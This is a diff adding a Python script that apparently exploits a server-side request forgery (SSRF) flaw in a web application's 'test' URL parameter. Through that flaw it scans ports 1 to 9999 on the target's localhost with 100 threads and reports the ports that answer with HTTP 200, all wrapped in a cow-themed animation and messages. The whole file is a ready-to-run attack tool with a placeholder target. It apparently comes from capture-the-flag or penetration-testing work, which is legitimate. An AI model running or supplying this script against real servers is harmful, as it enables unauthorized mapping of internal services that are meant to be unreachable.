@@ -1,0 +1,83 @@
+#!/usr/bin/env python3
+
+import requests
+from concurrent.futures import ThreadPoolExecutor
+import sys
+import threading
+import time
+from colorama import init, Fore, Style
+
+# Initialize colorama
+init()
+
+# Target application URL with SSRF vulnerability
+base_url = "http://X.X.X.X:<PORT HERE>/testing?test=http://127.0.0.1:{}"
+
+# Define the range of ports to scan
+ports = range(1, 10000)
+
+# Headers for the request
+headers = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+    "Accept": "image/avif,image/webp,*/*",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Connection": "keep-alive"
+}
+
+# Timeout for each request
+timeout = 3  # seconds
+
+# Animation control flag
+scanning = True
+results = []  # List to store open port results
+
+def scan_port(port):
+    try:
+        # Format the SSRF payload for the current port
+        url = base_url.format(port)
+        
+        # Send the request
+        response = requests.get(url, headers=headers, timeout=timeout)
+        
+        # Check if the port is open (e.g., 200 OK or other positive status)
+        if response.status_code == 200:
+            results.append(f"Port {port} is OPEN")
+    except requests.exceptions.RequestException:
+        # Ignore closed ports or timeouts
+        pass
+
+def animate():
+    bar_length = 20  # Length of the bar
+    cow = u"\U0001F404"  # Cow emoji
+    while scanning:
+        for position in range(bar_length + 1):
+            bar = " " * position + cow + " " * (bar_length - position) + "|"
+            sys.stdout.write(f"\r{bar}{Style.RESET_ALL}")  # Animation without background
+            sys.stdout.flush()
+            time.sleep(0.1)
+        sys.stdout.write("\r")  # Clear the line when done
+
+# Print the static text
+print(f"{Fore.RED}The cows got loose. Where from?{Style.RESET_ALL}")
+
+# Start the animation in a separate thread
+animation_thread = threading.Thread(target=animate)
+animation_thread.start()
+
+# Use ThreadPoolExecutor for faster scanning
+with ThreadPoolExecutor(max_workers=100) as executor:
+    executor.map(scan_port, ports)
+
+# Stop the animation
+scanning = False
+animation_thread.join()
+
+# Display appropriate message based on results
+if results:
+    print("\nWhoops! Hole in the fence at:")
+    for result in results:
+        print(f"{Fore.GREEN}{result}{Style.RESET_ALL}")
+    # Display the "Bring 'em on home" message if there are open ports
+    print("\nBring 'em on home 🤠🐎➰🐄")
+else:
+    print(f"\n{Fore.YELLOW}Ain't no holes in dis here fence.🤔{Style.RESET_ALL}")
